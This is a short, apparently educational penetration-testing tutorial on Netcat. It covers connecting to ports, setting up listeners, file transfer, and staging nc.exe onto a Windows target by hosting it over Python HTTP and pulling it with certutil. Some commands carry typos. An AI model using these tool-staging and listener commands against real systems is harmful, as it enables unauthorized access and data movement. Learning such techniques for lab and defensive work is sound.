Conecting to a target
-nc <target_ip> <port>


We can also enable verbose output and disable DNS resolution when connecting to a port with Netcat. 
This is very useful as Netcat will display diagnostic information regarding the success of the connection.

-nc -nv 10.4.20.244 80

In addition to connecting to TCP ports, Netcat can also be used to connect to UDP ports. This can be done by running the following command

-nc nvu <target_ip> <port>

 Transferring the Netcat executable to the Windows system

In order to analyze how Netcat works in both server and client mode, we will need to transfer the nc.exe executable to the target system running Windows.

Kali Linux comes pre-packaged with the nc.exe executable, we can host the executable by setting up an HTTP server with Python

The first step will involve navigating to the /usr/share/windows-binaries directory. This can be done by running the following command

-cd /usr/share/windows-binaries

We can then setup an HTTP server with Python within this directory by running the following command:
-python -m SimpleHTTPServer 80

From the target machine, run this
-certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe

 Setting up a Netcat listener

Now that we have Netcat setup on both systems, we can setup a Netcat listener on the Kali Linux system by running the following command:
-nc -nvlp 1234

We can now connect to the Netcat listener from the Target system running Windows from the command line by running he following command:

-nc -nv 10.10.3.3 1234

Transferring files with Netcat

Netcat can also be used to transfer files between a listener and a client.

For example, we can transfer a file from the Kali Linux system to the Windows system.

To get started, we can create a file called test.txt on the Kali Linux system with some sample data by running the following command:

-echo "Hello, this was sent over with Netcat" >> test.txt
We will now need to setup a Netcat listener on the recipient system, which in this case is the Windows system. This can be done by running the following command:

-nc.exe -nvlp 1234 > test.txt
